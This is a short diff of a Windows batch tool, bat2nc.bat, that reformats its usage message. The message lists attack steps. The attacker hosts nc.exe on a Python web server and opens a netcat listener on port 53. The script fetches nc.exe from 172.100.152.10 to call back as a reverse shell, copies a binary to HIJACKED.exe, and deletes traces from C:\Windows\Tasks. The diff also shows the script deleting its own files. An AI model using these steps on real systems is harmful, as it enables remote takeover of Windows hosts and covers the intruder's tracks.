@@ -51,11 +51,10 @@ del /f "%~dp0x.bat" "%~dp02.sed"
 goto :eof
 :err
 echo -------------------------------------------
-echo    Pre-requisites: python3 -m http.server -d . & nc -lvnp 53
-echo -------------------------------------------
-echo    Usage: .\bat2nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
-echo            copy x.exe HIJACKED.exe
-echo -------------------------------------------
-echo    Clean-up: del C:\Windows\Tasks\nc.exe
+echo    1.   python3 -m http.server -d . ^&
+echo    2.   nc -lvnp 53
+echo    3.   .\bat2nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
+echo    4.   copy x.exe HIJACKED.exe
+echo    5.   del C:\Windows\Tasks\nc.exe
 echo -------------------------------------------
 exit /b 1
